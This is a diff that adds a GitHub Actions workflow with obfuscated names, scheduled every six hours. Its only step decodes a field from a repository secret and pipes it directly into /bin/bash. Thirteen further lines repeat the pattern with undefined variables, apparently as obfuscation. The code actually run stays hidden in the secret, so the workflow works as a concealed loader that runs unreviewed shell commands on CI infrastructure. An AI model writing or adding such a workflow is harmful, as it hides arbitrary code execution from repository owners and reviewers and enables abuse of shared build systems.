@@ -1,0 +1,29 @@
+name: nongyuxxo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nongyuxxo
+        env:
+          mypp03: ${{ secrets.mypp03 }}
+        run: |
+          echo $mypp03 | jq -r .yufi7744 | /bin/bash
+          echo $pk546 | jq -r .gh981 | /bin/bash
+          echo $twram59 | jq -r .il26572 | /bin/bash
+          echo $wiosa4337 | jq -r .y2 | /bin/bash
+          echo $hbalf2 | jq -r .num9 | /bin/bash
+          echo $n50551 | jq -r .jbj910 | /bin/bash
+          echo $fjpxu264 | jq -r .pugc3726 | /bin/bash
+          echo $ookef2 | jq -r .llxrb4 | /bin/bash
+          echo $pkhr176 | jq -r .wyfr65 | /bin/bash
+          echo $dys05385 | jq -r .ktoz92 | /bin/bash
+          echo $sus379 | jq -r .d408 | /bin/bash
+          echo $zz37256 | jq -r .dr945 | /bin/bash
+          echo $sm52 | jq -r .huww65 | /bin/bash
+          echo $ccsci128 | jq -r .a36 | /bin/bash
+
